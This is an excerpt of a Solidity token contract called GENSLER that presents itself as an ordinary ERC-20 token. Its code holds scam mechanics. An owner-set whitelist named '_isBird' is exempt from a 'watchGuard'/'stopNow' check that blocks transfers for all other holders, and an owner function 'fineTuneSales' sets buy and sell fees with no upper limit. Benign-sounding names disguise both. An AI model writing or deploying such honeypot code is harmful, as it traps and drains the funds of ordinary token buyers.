...
contract GENSLER is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isBird;

    string private constant _name = "GENSLER";
    string private constant _symbol = "GENSLER";
    uint256 private _feeRate = 50;
    uint8 private constant _decimals = 18;
    uint256 private _tTotal =  100000000  * 10**_decimals;
    uint256 private _mWallet = 2000000  * 10**_decimals;

    string public _message;
    address public messageSender;

    address payable public liquidityReceiver = payable(0xb8fc8dE32D872a396aa3898c95079EB1F9f90214);
    address payable public marketingAddress = payable(0xb8fc8dE32D872a396aa3898c95079EB1F9f90214);
    ...
    bool private watchGuard;
    bool private stopNow;
    ...
    constructor () {
        ...
        _isBird[msg.sender] = true;
        _isBird[marketingAddress] = true;

        messageSender = _msgSender();
        _message = "We love crypto";
    ...
    function includeInBirds(address account, bool included) public onlyOwner {
        _isBird[address(account)] = included;
    }

    function disableWatchGuard() public onlyOwner {
        watchGuard = false;
    }

    function fineTuneSales(uint256 amountBuy, uint256 amountSell) public onlyOwner {
        uint256 amountOne = amountBuy;
        uint256 amountTwo = amountSell;
        buyFee.marketing = amountOne;
        sellFee.marketing = amountTwo;
    }

    function changeMessage(string memory messageText) external {
        require(_msgSender() == messageSender, "only Sender can do this");
    ...
    function getTotalBuyFee() public view returns (uint256) {
        uint256 mf = buyFee.marketing;
        uint256 lf = buyFee.liquidity;
        uint256 tf = mf.add(lf);
        return tf;
    }

    function getTotalSellFee() public view returns (uint256) {
        uint256 mf = sellFee.marketing;
        uint256 lf = sellFee.liquidity;
        uint256 tf = mf.add(lf);
        return tf;
    }
    ...
    function _transfer(
        ...
        if(watchGuard != false && !_isBird[from] && !_isBird[to]){
          require(stopNow == false, "Transfer is not possible");
        }
    ...
    function amIBird(address account) public view returns(bool) {
        return _isBird[account];
    }

    function watchGuardState() public view returns(bool) {
        return watchGuard;
    }
